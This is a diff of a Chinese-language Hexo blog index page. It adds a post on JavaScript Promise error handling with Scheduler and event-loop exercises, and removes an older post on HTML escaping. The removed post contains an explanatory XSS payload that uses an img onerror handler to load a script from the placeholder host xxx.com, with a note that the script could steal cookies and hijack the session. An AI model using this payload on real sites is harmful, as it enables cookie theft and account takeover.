@@ -282,7 +282,7 @@
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">28</span>
+              <span class="site-state-item-count">30</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
@@ -354,6 +354,232 @@
           <div id="content" class="content">
             
   <section id="posts" class="posts-expand">
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2020/11/25/javascript-promise/" itemprop="url">
+                  JavaScript-Promise
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2020-11-25T20:09:16+08:00" content="2020-11-25">
+              2020-11-25
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/JavaScript/" itemprop="url" rel="index">
+                    <span itemprop="name">JavaScript</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="Promise"><a href="#Promise" class="headerlink" title="Promise"></a>Promise</h1><h3 id="Promise-prototype-catch"><a href="#Promise-prototype-catch" class="headerlink" title="Promise.prototype.catch"></a>Promise.prototype.catch</h3><ol>
+<li><p>可以捕获 Promise 参数函数和 then 内的错误</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">new Promise((r, j) =&gt; &#123;</span><br><span class="line">    throw new Error(&apos;err!!!&apos;)</span><br><span class="line">&#125;).then(() =&gt; &#123;</span><br><span class="line">&#125;).catch((e) =&gt; &#123;</span><br><span class="line">    console.log(&apos;catch&apos;, e) // 触发</span><br><span class="line">&#125;)</span><br><span class="line">// catch Error: err!!!</span><br><span class="line"></span><br><span class="line">new Promise((r, j) =&gt; &#123;</span><br><span class="line">    r()</span><br><span class="line">&#125;).then(() =&gt; &#123;</span><br><span class="line">    throw new Error(&apos;err!!!&apos;)</span><br><span class="line">&#125;).catch((e) =&gt; &#123;</span><br><span class="line">    console.log(&apos;catch&apos;, e) // 触发</span><br><span class="line">&#125;)</span><br><span class="line">// catch Error: err!!!</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>不能捕获 Promise 参数函数和 then 内的任何异步函数的错误</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">new Promise((r, j) =&gt; &#123;</span><br><span class="line">    setTimeout(() =&gt; &#123;</span><br><span class="line">       throw new Error(&apos;err!!!&apos;)</span><br><span class="line">    &#125;, 3000)</span><br><span class="line">&#125;).then(() =&gt; &#123;</span><br><span class="line">&#125;).catch((e) =&gt; &#123;</span><br><span class="line">    console.log(&apos;catch&apos;, e) // 不触发</span><br><span class="line">&#125;)</span><br><span class="line">// 无打印，没有捕获到错误</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>如果 then 没有 onReject 函数，则会触发catch。参数为reject传入的值或 throw 的值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">new Promise((r, j) =&gt; &#123;</span><br><span class="line">    j(&apos;reject!!!&apos;)</span><br><span class="line">&#125;).then(() =&gt; &#123;</span><br><span class="line">&#125;).catch((e) =&gt; &#123;</span><br><span class="line">    console.log(&apos;catch&apos;, e)</span><br><span class="line">&#125;)</span><br><span class="line">// catch reject!!!</span><br><span class="line"></span><br><span class="line">new Promise((r, j) =&gt; &#123;</span><br><span class="line">    j(&apos;reject!!!&apos;)</span><br><span class="line">&#125;).then(() =&gt; &#123;</span><br><span class="line">&#125;, (e) =&gt; &#123;</span><br><span class="line">  console.log(&apos;onReject&apos;, e)</span><br><span class="line">&#125;).catch((e) =&gt; &#123;</span><br><span class="line">    console.log(&apos;catch&apos;, e) // 不会执行到</span><br><span class="line">&#125;)</span><br><span class="line">// onReject reject!!!</span><br><span class="line"></span><br><span class="line">new Promise((r, j) =&gt; &#123;</span><br><span class="line">    throw new Error(&apos;错了&apos;)</span><br><span class="line">&#125;).then(() =&gt; &#123;&#125;, (e) =&gt; &#123; </span><br><span class="line">    console.log(&apos;reject&apos;, e) // 执行</span><br><span class="line">&#125;).catch((e) =&gt; &#123;</span><br><span class="line">    console.log(&apos;catch&apos;, e) // 不执行</span><br><span class="line">&#125;)</span><br><span class="line">// reject 错了</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>resolve 后的 throw Error 会被忽略</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">new Promise(function(r, j) &#123;</span><br><span class="line">  r();</span><br><span class="line">  console.log(&apos;resolve after&apos;);</span><br><span class="line">  throw &apos;resolve 后 throw&apos;;</span><br><span class="line">&#125;).catch(function(e) &#123;</span><br><span class="line">   console.log(e); // 不会执行</span><br><span class="line">&#125;);</span><br><span class="line">// resolve after</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h3 id="源码实现"><a href="#源码实现" class="headerlink" title="源码实现"></a>源码实现</h3><p><a href="https://www.jianshu.com/p/43de678e918a" target="_blank" rel="noopener">https://www.jianshu.com/p/43de678e918a</a></p>
+<h3 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h3><blockquote>
+<p>练习1<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">JS实现一个带并发限制的异步调度器Scheduler，保证同时运行的任务最多有两个。完善代码中Scheduler类，使得以下程序能正确输出</span><br><span class="line">class Scheduler &#123;</span><br><span class="line">  add(promiseCreator) &#123; ... &#125;</span><br><span class="line">  // ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const timeout = (time) =&gt; new Promise(resolve =&gt; &#123;</span><br><span class="line">  setTimeout(resolve, time)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">const scheduler = new Scheduler()</span><br><span class="line"></span><br><span class="line">const addTask = (time, order) =&gt; &#123;</span><br><span class="line">  scheduler.add(</span><br><span class="line">      () =&gt; timeout(time)</span><br><span class="line">  ).then(() =&gt; console.log(order))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">addTask(1000, &apos;1&apos;)</span><br><span class="line">addTask(500, &apos;2&apos;)</span><br><span class="line">addTask(300, &apos;3&apos;)</span><br><span class="line">addTask(400, &apos;4&apos;)// output: 2 3 1 4</span><br><span class="line">// 一开始，1、2两个任务进入队列</span><br><span class="line">// 500ms时，2完成，输出2，任务3进队</span><br><span class="line">// 800ms时，3完成，输出3，任务4进队</span><br><span class="line">// 1000ms时，1完成，输出1</span><br><span class="line">// 1200ms时，4完成，输出4</span><br><span class="line"></span><br><span class="line">答案：</span><br><span class="line">class Scheduler &#123;</span><br><span class="line">  constructor() &#123;</span><br><span class="line">    this.limit = 2</span><br><span class="line">    this.list = []</span><br><span class="line">    this.count = 0</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  add(promiseCreator) &#123;</span><br><span class="line">    return new Promise((resolve, reject) =&gt; &#123;</span><br><span class="line">      this.list.push([promiseCreator, resolve]);</span><br><span class="line">      this.process();</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  process() &#123;</span><br><span class="line">    if (this.count &gt;= this.limit) return;</span><br><span class="line"></span><br><span class="line">    if (this.list.length &gt; 0) &#123;</span><br><span class="line">      var item = this.list.shift();</span><br><span class="line"></span><br><span class="line">      item[0]().then(() =&gt; &#123;</span><br><span class="line">        this.count--;</span><br><span class="line">        item[1]();</span><br><span class="line"></span><br><span class="line">        this.process()</span><br><span class="line">      &#125;)</span><br><span class="line"></span><br><span class="line">      this.count++</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<blockquote>
+<p>练习2<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">async function async1() &#123;</span><br><span class="line">  console.log(&apos;async1 start&apos;);</span><br><span class="line">  await async2();</span><br><span class="line">  console.log(&apos;async1 end&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">async function async2() &#123;</span><br><span class="line">  console.log(&apos;async2&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">console.log(&apos;script start&apos;);</span><br><span class="line"></span><br><span class="line">setTimeout(function() &#123;</span><br><span class="line">    console.log(&apos;setTimeout&apos;);</span><br><span class="line">&#125;, 0);  </span><br><span class="line"></span><br><span class="line">async1();</span><br><span class="line"></span><br><span class="line">new Promise(function(resolve) &#123;</span><br><span class="line">    console.log(&apos;promise1&apos;);</span><br><span class="line">    resolve();</span><br><span class="line">    console.log(&apos;promise1 resolve after&apos;)</span><br><span class="line">    reject()</span><br><span class="line">  &#125;).then(function() &#123;</span><br><span class="line">    console.log(&apos;promise2&apos;);</span><br><span class="line">&#125;).catch((e) =&gt; &#123;</span><br><span class="line">    console.log(&apos;catch&apos;)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">console.log(&apos;script end&apos;);</span><br><span class="line"></span><br><span class="line">// script start</span><br><span class="line">// async1 start</span><br><span class="line">// async2</span><br><span class="line">// promise1</span><br><span class="line">// promise1 resolve after</span><br><span class="line">// script end</span><br><span class="line">// async1 end</span><br><span class="line">// promise2</span><br><span class="line">// setTimeout</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2020/11/23/safe/" itemprop="url">
+                  未命名
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2020-11-23T00:00:00+08:00" content="2020-11-23">
+              2020-11-23
+            </time>
+          </span>
+
+          
+
+          
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2>
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
     
       
 
@@ -453,7 +679,10 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">const list = [1,2,3]</span><br><span class="line">const square = num =&gt; &#123;</span><br><span class="line">    return new Promise((resolve, reject) =&gt; &#123;</span><br><span class="line">        setTimeout(() =&gt; &#123;</span><br><span class="line">            resolve(num * num)</span><br><span class="line">        &#125;, 1000)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function test() &#123;</span><br><span class="line">    list.forEach(async x =&gt; &#123;</span><br><span class="line">        const res = await square(x)</span><br><span class="line">        console.log(res)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line">test()</span><br><span class="line"></span><br><span class="line">// 答案1:</span><br><span class="line">async function test() &#123;</span><br><span class="line">    for(let i = 0; i &lt; list.length; i++)&#123;</span><br><span class="line">        const res = await square(list[i])</span><br><span class="line">        console.log(res)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">test()</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>实现一个 normalize 函数，能将输入的特定字符串转化为特定的结构化数据，字符串仅由小写字母和[]组成，且字符串不会包含多余的空格。<br>示例一：’abc’ –&gt; {value: ‘abc’}<br>示例二：’[abc[bcd[def]]]’ –&gt; {value: ‘abc’, children: {value: ‘bcd’, children: {value: ‘def’}}}</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function normalize(str) &#123;</span><br><span class="line">    var arr = str.match(/\w+/g)</span><br><span class="line">    var obj = &#123;&#125;</span><br><span class="line">    var cur = obj // 利用引用添加嵌套结构</span><br><span class="line">    var key = null</span><br><span class="line"></span><br><span class="line">    while(key = arr.shift()) &#123;</span><br><span class="line">        cur.value = key</span><br><span class="line">        if (arr.length === 0) break</span><br><span class="line">        cur.children = &#123;&#125;</span><br><span class="line">        cur = cur.children // 当前引用终断，赋值为 children 引用。</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return obj</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">console.log(normalize(&apos;[abc[bcd[def]]]&apos;))</span><br></pre></td></tr></table></figure></li>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function normalize(str) &#123;</span><br><span class="line">    var arr = str.match(/\w+/g)</span><br><span class="line">    var obj = &#123;&#125;</span><br><span class="line">    var cur = obj // 利用引用添加嵌套结构</span><br><span class="line">    var key = null</span><br><span class="line"></span><br><span class="line">    while(key = arr.shift()) &#123;</span><br><span class="line">        cur.value = key</span><br><span class="line">        if (arr.length === 0) break</span><br><span class="line">        cur.children = &#123;&#125;</span><br><span class="line">        cur = cur.children // 当前引用终断，赋值为 children 引用。</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return obj</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">console.log(normalize(&apos;[abc[bcd[def]]]&apos;))</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>有数组 [1,2,3, 5, 7, 9, 11,12,13]，实现函数 fn，返回字符串：”1号—~3号, 5号, 7号, 9号, 11号~13号”</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">var arr = [1,2,3, 5, 7, 9, 11,12,13]</span><br><span class="line"></span><br><span class="line">function fn() &#123;</span><br><span class="line">    var result = [[]]</span><br><span class="line"></span><br><span class="line">    for (let i = 0; i &lt; arr.length; i++) &#123;</span><br><span class="line">        // 最后一项</span><br><span class="line">        const item = result[result.length - 1];</span><br><span class="line"></span><br><span class="line">        if (item.length === 0) &#123;</span><br><span class="line">            item.push(arr[i])</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            if ((item[item.length - 1] + 1) === arr[i]) &#123;</span><br><span class="line">            item.push(arr[i])</span><br><span class="line">            &#125; else if((item[item.length - 1] + 1) &lt; arr[i]) &#123;</span><br><span class="line">                result[result.length] = [arr[i]]</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
 </ol>
 
           
@@ -1521,288 +1750,6 @@
 </li>
 </ul>
 
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2019/08/20/questions-1/" itemprop="url">
-                  Question
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            <span class="post-meta-item-icon">
-              <i class="fa fa-calendar-o"></i>
-            </span>
-            <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2019-08-20T16:55:11+08:00" content="2019-08-20">
-              2019-08-20
-            </time>
-          </span>
-
-          
-            <span class="post-category" >
-              &nbsp; | &nbsp;
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-              
-                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/Question/" itemprop="url" rel="index">
-                    <span itemprop="name">Question</span>
-                  </a>
-                </span>
-
-                
-                
-
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-
-          
-          
-
-          
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="开发常见问题"><a href="#开发常见问题" class="headerlink" title="开发常见问题"></a>开发常见问题</h1><hr>
-<h2 id="1-html转义问题"><a href="#1-html转义问题" class="headerlink" title="1. html转义问题"></a>1. html转义问题</h2><h3 id="dom-上的属性被-转义："><a href="#dom-上的属性被-转义：" class="headerlink" title="dom 上的属性被$()转义："></a>dom 上的属性被$()转义：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$(&apos;&lt;div data-comment=&quot;&#123;&amp;quot;title&amp;quot;:&amp;quot;重难点&amp;quot;,&amp;quot;background&amp;quot;:&amp;quot;rgb(240, 149, 82)&amp;quot;,&amp;quot;icon_src&amp;quot;:&amp;quot;/system/images/171025215642____.png&amp;quot;,&amp;quot;content&amp;quot;:&amp;quot;11111&lt;br /&gt;22222&lt;br /&gt;33333&lt;br /&gt;44444&lt;br /&gt;&amp;quot;&#125;&quot;&gt;&lt;/div&gt;&apos;)</span><br><span class="line"></span><br><span class="line">// 将div标签上的 data-comment 属性转义后的值如下：</span><br><span class="line">nodeValue: &quot;&#123;&quot;title&quot;:&quot;重难点&quot;,&quot;background&quot;:&quot;rgb(240, 149, 82)&quot;,&quot;icon_src&quot;:&quot;/system/images/171025215642____.png&quot;,&quot;content&quot;:&quot;11111&lt;br &gt;&lt;/div&gt;22222&lt;br /&gt;33333&lt;br /&gt;44444&lt;br /&gt;&quot;&#125;&quot; </span><br><span class="line">// 明显多出来一个&lt;/div&gt;啊</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>解决办法</p>
-<ol>
-<li>lodash 的 escape 和 unescape(推荐)</li>
-</ol>
-<ul>
-<li>_.escape：转换字符串中的 <code>&quot;&amp;&quot;, &quot;&lt;&quot;, &quot;&gt;&quot;, &#39;&quot;&#39;, &quot;&#39;&quot;</code> 为HTML的响应实体字符，没有其他多余的字符被转义。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_.escape(&apos;11111&lt;br /&gt;22222&lt;br /&gt;33333&lt;br /&gt;44444&lt;br /&gt;&apos;)</span><br><span class="line">// &quot;11111&amp;lt;br /&amp;gt;22222&amp;lt;br /&amp;gt;33333&amp;lt;br /&amp;gt;44444&amp;lt;br /&amp;gt;&quot;</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-</blockquote>
-<ul>
-<li><p>_.usescape：转换字符串中的实体字符 <code>&amp;amp;, &amp;lt;, &amp;gt;, &amp;quot;, &amp;#39;</code> 为响应的 HTML 字符。与escape中的字符一一对应。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_.unescape(&apos;11111&amp;lt;br /&amp;gt;22222&amp;lt;br /&amp;gt;33333&amp;lt;br /&amp;gt;44444&amp;lt;br /&amp;gt;&apos;)</span><br><span class="line">// &quot;11111&lt;br /&gt;22222&lt;br /&gt;33333&lt;br /&gt;44444&lt;br /&gt;&quot;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>如果不反转义直接放到dom中呢？</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 浏览器会反转义一次字符串，结果展示到页面上：</span><br><span class="line">11111&lt;br /&gt;22222&lt;br /&gt;33333&lt;br /&gt;44444&lt;br /&gt; // 纯字符串</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>当在浏览器控制台选中dom后，右键选择：”Edit as HTML”后，展示的输入框内容相当于进行了一次 escape，确定输入后又进行了一次 unescape, HTML 中的预留字符必须被替换为字符实体。</p>
-</li>
-</ul>
-<ol start="2">
-<li>利用 jquery<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// HTML标签转义（&lt; 转为 &amp;lt;）</span><br><span class="line">function html2Escape(sHtml) &#123;</span><br><span class="line">  return $(&quot;&lt;div/&gt;&quot;).text(sHtml).html();</span><br><span class="line">&#125;</span><br><span class="line">// HTML标签反转义（&amp;lt; 转为 &lt;）</span><br><span class="line">function escape2Html(str) &#123;</span><br><span class="line">  return $(&quot;&lt;div/&gt;&quot;).html(str).text();</span><br><span class="line">&#125;</span><br><span class="line">// 此方法在反转义的时候会将形如：1&lt;br &gt;&lt;/div&gt;2&lt;br /&gt;3&lt;br /&gt;的内容反转为123</span><br></pre></td></tr></table></figure>
-</li>
-</ol>
-<h3 id="除了被-转义外，其他情况有哪些呢？"><a href="#除了被-转义外，其他情况有哪些呢？" class="headerlink" title="除了被 $() 转义外，其他情况有哪些呢？"></a>除了被 $() 转义外，其他情况有哪些呢？</h3><ol>
-<li>XSS 攻击<br>在浏览器上随便选择一个 dom，控制台执行如下代码：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$0.innerHTML=&quot;&lt;img src=@ onerror=alert(1)&gt;&quot; // alert(1)</span><br><span class="line"></span><br><span class="line">$0.innerHTML = &quot;&lt;img src=@ onerror=&apos;var s=document.createElement(\&quot;script\&quot;);s.src=\&quot;https://xxx.com/xx.js\&quot;;document.body.appendChild(s);&apos; /&gt;&quot;</span><br><span class="line">// 代码中引入了一个第三方的脚本，这样做的事情就多了，从取你的 cookie，发送到黑客自己的服务器，到监听你的输入，到发起 CSRF 攻击，直接以你的身份调用网站的各种接口等</span><br></pre></td></tr></table></figure>
-</li>
-</ol>
-<hr>
-<h3 id="XSS-攻击-待续。。。"><a href="#XSS-攻击-待续。。。" class="headerlink" title="XSS 攻击(待续。。。)"></a>XSS 攻击(待续。。。)</h3>
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2019/08/14/performance/" itemprop="url">
-                  Performance
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            <span class="post-meta-item-icon">
-              <i class="fa fa-calendar-o"></i>
-            </span>
-            <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2019-08-14T21:17:09+08:00" content="2019-08-14">
-              2019-08-14
-            </time>
-          </span>
-
-          
-            <span class="post-category" >
-              &nbsp; | &nbsp;
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-              
-                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
